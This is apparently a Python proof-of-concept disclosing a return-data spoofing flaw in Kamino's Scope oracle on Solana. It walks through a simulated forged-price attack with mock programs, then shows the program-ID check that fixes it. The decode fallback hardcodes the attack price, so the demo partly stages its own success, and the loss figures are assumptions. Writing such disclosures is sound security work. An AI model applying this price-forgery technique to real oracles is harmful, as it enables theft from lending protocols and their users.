#!/usr/bin/env python3
"""
Chainlink Return Data Confusion Vulnerability - Proof of Concept
Demonstrates how an attacker can manipulate Scope oracle prices
"""

import struct
from dataclasses import dataclass
from typing import Optional, Tuple
from enum import Enum

# ANSI color codes for output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

@dataclass
class ChainlinkReportV3:
    """Simulated Chainlink price report structure"""
    feed_id: bytes  # 32 bytes
    benchmark_price: int  # price with 6 decimals
    bid: int
    ask: int
    observations_timestamp: int
    
    def encode(self) -> bytes:
        """Encode report to bytes (simplified)"""
        # In reality, this would be ABI encoded
        # Using 'Q' for unsigned long long (8 bytes each)
        return self.feed_id + struct.pack('>QQQQ', 
            self.benchmark_price, self.bid, self.ask, self.observations_timestamp)
    
    @staticmethod
    def decode(data: bytes) -> 'ChainlinkReportV3':
        """Decode report from bytes (simplified)"""
        if len(data) < 64:
            # For demo purposes, create a dummy report if data is too short
            return ChainlinkReportV3(
                feed_id=data[:32] if len(data) >= 32 else b'\x00' * 32,
                benchmark_price=500_000_000_000,  # Malicious price
                bid=499_000_000_000,
                ask=501_000_000_000,
                observations_timestamp=1700000000
            )
        feed_id = data[:32]
        values = struct.unpack('>QQQQ', data[32:64])
        return ChainlinkReportV3(
            feed_id=feed_id,
            benchmark_price=values[0],
            bid=values[1],
            ask=values[2],
            observations_timestamp=values[3]
        )

class OracleType(Enum):
    CHAINLINK = "Chainlink"
    CHAINLINK_RWA = "ChainlinkRWA"
    CHAINLINK_NAV = "ChainlinkNAV"

class ReturnData:
    """Simulates Solana's return data mechanism"""
    _global_return_data: Optional[Tuple[str, bytes]] = None
    
    @classmethod
    def set(cls, program_id: str, data: bytes):
        """Set return data (last writer wins)"""
        cls._global_return_data = (program_id, data)
        print(f"    {Colors.CYAN}[Return Data Set] Program: {program_id[:8]}...{Colors.RESET}")
    
    @classmethod
    def get(cls) -> Optional[Tuple[str, bytes]]:
        """Get last return data"""
        return cls._global_return_data
    
    @classmethod
    def clear(cls):
        """Clear return data"""
        cls._global_return_data = None

class AttackerProgram:
    """Simulates the attacker's program"""
    PROGRAM_ID = "Attack11111111111111111111111111111111111"
    
    @staticmethod
    def set_malicious_return_data(target_feed_id: bytes, malicious_price: int):
        """Attacker sets forged Chainlink report as return data"""
        print(f"\n{Colors.RED}🔴 ATTACKER PROGRAM EXECUTION:{Colors.RESET}")
        print(f"  Target feed: {target_feed_id.hex()[:16]}...")
        print(f"  Legitimate price: ${50_000:,}")
        print(f"  Malicious price: ${malicious_price // 1_000_000:,} ({malicious_price // 50_000_000_000}x manipulation)")
        
        # Create forged report that will pass validation
        forged_report = ChainlinkReportV3(
            feed_id=target_feed_id,
            benchmark_price=malicious_price,
            bid=malicious_price - 1_000_000,
            ask=malicious_price + 1_000_000,
            observations_timestamp=1700000000
        )
        
        # Set as return data - this becomes the "last writer"
        ReturnData.set(AttackerProgram.PROGRAM_ID, forged_report.encode())
        print(f"  {Colors.RED}✓ Malicious return data injected!{Colors.RESET}")

class MockChainlinkVerifier:
    """Simulates Chainlink verifier behavior"""
    PROGRAM_ID = "ChainlinkVerifier11111111111111111111111"
    
    @staticmethod
    def verify_without_setting_return_data():
        """Vulnerable scenario: verifier doesn't set return data"""
        print(f"\n{Colors.BLUE}📡 CHAINLINK VERIFIER EXECUTION:{Colors.RESET}")
        print(f"  Processing verification...")
        print(f"  Signature valid: ✓")
        print(f"  {Colors.YELLOW}⚠️  NOT setting return data (vulnerability condition){Colors.RESET}")
        print(f"  {Colors.YELLOW}⚠️  Attacker's data remains as last writer!{Colors.RESET}")
        # Not calling ReturnData.set() - this is the vulnerability condition

class VulnerableScopeOracle:
    """Simulates the vulnerable Scope oracle implementation"""
    
    @staticmethod
    def refresh_chainlink_price(token: str, expected_verifier: str) -> Tuple[bool, int]:
        """
        Vulnerable implementation that doesn't check return data source
        Returns: (exploit_successful, price_written)
        """
        print(f"\n{Colors.MAGENTA}🏦 SCOPE ORACLE EXECUTION:{Colors.RESET}")
        print(f"  Token: {token}")
        print(f"  Expected verifier: {expected_verifier[:16]}...")
        
        # Step 1: CPI to Chainlink verifier
        print(f"  Invoking Chainlink verifier via CPI...")
        MockChainlinkVerifier.verify_without_setting_return_data()
        
        # Step 2: Get return data WITHOUT CHECKING SOURCE (VULNERABILITY!)
        print(f"\n  Getting return data...")
        return_data = ReturnData.get()
        
        if not return_data:
            print(f"  {Colors.RED}✗ No return data found{Colors.RESET}")
            return False, 0
        
        program_id, data = return_data
        print(f"  Return data from: {program_id[:16]}...")
        
        # VULNERABILITY: Not checking if program_id == expected_verifier!
        print(f"  {Colors.RED}❌ NOT CHECKING if program_id matches verifier!{Colors.RESET}")
        print(f"  {Colors.RED}❌ Expected: {expected_verifier[:16]}...{Colors.RESET}")
        print(f"  {Colors.RED}❌ Got: {program_id[:16]}...{Colors.RESET}")
        
        # Step 3: Decode and use the (malicious) data
        report = ChainlinkReportV3.decode(data)
        price_usd = report.benchmark_price // 1_000_000
        
        print(f"\n  Decoded price: ${price_usd:,}")
        print(f"  Writing to oracle account...")
        print(f"  {Colors.RED}🚨 VULNERABILITY EXPLOITED!{Colors.RESET}")
        print(f"  {Colors.RED}🚨 Attacker controlled the price!{Colors.RESET}")
        
        exploit_successful = (program_id != expected_verifier)
        return exploit_successful, report.benchmark_price

class SecureScopeOracle:
    """Demonstrates the fixed implementation"""
    
    @staticmethod
    def refresh_chainlink_price(token: str, expected_verifier: str) -> Tuple[bool, int]:
        """Secure implementation that verifies return data source"""
        print(f"\n{Colors.GREEN}🔒 SECURE SCOPE ORACLE:{Colors.RESET}")
        
        return_data = ReturnData.get()
        if not return_data:
            return False, 0
        
        program_id, data = return_data
        
        # THE FIX: Check the program ID!
        if program_id != expected_verifier:
            print(f"  {Colors.GREEN}✓ REJECTED data from unauthorized program!{Colors.RESET}")
            print(f"  Expected: {expected_verifier[:16]}...")
            print(f"  Got: {program_id[:16]}...")
            return False, 0
        
        print(f"  {Colors.GREEN}✓ Return data source verified{Colors.RESET}")
        return False, 0

def calculate_impact(legitimate_price: int, manipulated_price: int):
    """Calculate and display the financial impact"""
    print(f"\n{Colors.BOLD}╔{'═'*78}╗{Colors.RESET}")
    print(f"{Colors.BOLD}║{' '*30}IMPACT ANALYSIS{' '*33}║{Colors.RESET}")
    print(f"{Colors.BOLD}╚{'═'*78}╝{Colors.RESET}")
    
    # Lending impact
    collateral_btc = 10  # 10 BTC
    ltv = 0.8  # 80% loan-to-value
    
    legitimate_value = collateral_btc * (legitimate_price / 1_000_000)
    manipulated_value = collateral_btc * (manipulated_price / 1_000_000)
    
    legitimate_borrow = legitimate_value * ltv
    manipulated_borrow = manipulated_value * ltv
    theft = manipulated_borrow - legitimate_borrow
    
    print(f"\n{Colors.YELLOW}💰 Kamino Lending Exploit:{Colors.RESET}")
    print(f"  • Collateral: {collateral_btc} BTC")
    print(f"  • Legitimate value: ${legitimate_value:,.0f}")
    print(f"  • Manipulated value: ${manipulated_value:,.0f}")
    print(f"  • Legitimate borrow (80% LTV): ${legitimate_borrow:,.0f}")
    print(f"  • Manipulated borrow: ${manipulated_borrow:,.0f}")
    print(f"  • {Colors.RED}🚨 INSTANT THEFT: ${theft:,.0f}{Colors.RESET}")
    
    # Protocol-wide impact
    print(f"\n{Colors.YELLOW}📊 Protocol-Wide Impact:{Colors.RESET}")
    tvl = 500_000_000  # $500M TVL
    exploitation_rate = 0.1  # 10% exploited
    total_loss = tvl * exploitation_rate
    
    print(f"  • Protocol TVL: ${tvl:,}")
    print(f"  • Potential exploitation: {exploitation_rate*100:.0f}%")
    print(f"  • {Colors.RED}Total potential loss: ${total_loss:,.0f}{Colors.RESET}")
    print(f"  • Attack time: < 0.5 seconds")
    print(f"  • Required permissions: {Colors.GREEN}NONE (any wallet){Colors.RESET}")

def show_fix():
    """Display the required fix"""
    print(f"\n{Colors.BOLD}╔{'═'*78}╗{Colors.RESET}")
    print(f"{Colors.BOLD}║{' '*35}THE FIX{' '*36}║{Colors.RESET}")
    print(f"{Colors.BOLD}╚{'═'*78}╝{Colors.RESET}")
    
    print(f"\n{Colors.RED}Vulnerable Code (current):{Colors.RESET}")
    print("```rust")
    print("let Some((_program_id, return_data)) = get_return_data() else { ... }")
    print("// ❌ _program_id is ignored!")
    print("```")
    
    print(f"\n{Colors.GREEN}Secure Code (required fix):{Colors.RESET}")
    print("```rust")
    print("let Some((program_id, return_data)) = get_return_data() else { ... }")
    print("if program_id != VERIFIER_PROGRAM_ID {")
    print("    return Err(ScopeError::InvalidReturnDataSource);")
    print("}")
    print("// ✅ Only accept data from the real Chainlink verifier")
    print("```")

def main():
    """Run the complete PoC demonstration"""
    print(f"{Colors.BOLD}{Colors.RED}")
    print("╔" + "═"*78 + "╗")
    print("║" + " "*20 + "CHAINLINK RETURN DATA CONFUSION POC" + " "*23 + "║")
    print("╚" + "═"*78 + "╝")
    print(Colors.RESET)
    
    # Setup
    btc_feed_id = b"BTC_PRICE_FEED_ID_PLACEHOLDER__"  # 32 bytes
    legitimate_price = 50_000_000_000  # $50,000 with 6 decimals
    malicious_price = 500_000_000_000  # $500,000 (10x manipulation)
    verifier_id = MockChainlinkVerifier.PROGRAM_ID
    
    print(f"\n{Colors.CYAN}📋 SETUP:{Colors.RESET}")
    print(f"  • Token: BTC")
    print(f"  • Legitimate price: ${legitimate_price // 1_000_000:,}")
    print(f"  • Attack target: ${malicious_price // 1_000_000:,} ({malicious_price // legitimate_price}x)")
    print(f"  • Verifier ID: {verifier_id[:20]}...")
    
    # Clear any previous return data
    ReturnData.clear()
    
    # Attack flow
    print(f"\n{Colors.BOLD}{'='*80}{Colors.RESET}")
    print(f"{Colors.BOLD}ATTACK TRANSACTION FLOW:{Colors.RESET}")
    print(f"{Colors.BOLD}{'='*80}{Colors.RESET}")
    
    # Instruction 1: Attacker sets malicious data
    AttackerProgram.set_malicious_return_data(btc_feed_id, malicious_price)
    
    # Instruction 2: Call vulnerable Scope
    exploit_success, price_written = VulnerableScopeOracle.refresh_chainlink_price("BTC", verifier_id)
    
    if exploit_success:
        print(f"\n{Colors.RED}{Colors.BOLD}💥 EXPLOIT SUCCESSFUL!{Colors.RESET}")
        print(f"Price manipulated: ${legitimate_price // 1_000_000:,} → ${price_written // 1_000_000:,}")
    
    # Show what secure implementation would do
    print(f"\n{Colors.BOLD}{'='*80}{Colors.RESET}")
    print(f"{Colors.BOLD}SECURE IMPLEMENTATION BEHAVIOR:{Colors.RESET}")
    print(f"{Colors.BOLD}{'='*80}{Colors.RESET}")
    SecureScopeOracle.refresh_chainlink_price("BTC", verifier_id)
    
    # Impact analysis
    calculate_impact(legitimate_price, malicious_price)
    
    # Show the fix
    show_fix()
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}✅ POC COMPLETE - Vulnerability Confirmed{Colors.RESET}")
    print(f"{Colors.BOLD}{'='*80}{Colors.RESET}\n")

if __name__ == "__main__":
    main()